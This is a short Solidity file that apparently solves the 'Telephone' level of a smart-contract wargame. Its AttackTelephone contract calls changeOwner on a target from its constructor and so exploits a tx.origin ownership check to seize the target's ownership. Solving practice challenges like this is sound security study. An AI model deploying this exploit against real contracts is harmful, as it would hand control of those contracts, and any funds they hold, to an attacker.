// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract AttackTelephone {
    constructor(address _target) {
        ITelephone(_target).changeOwner(msg.sender);
    }
}
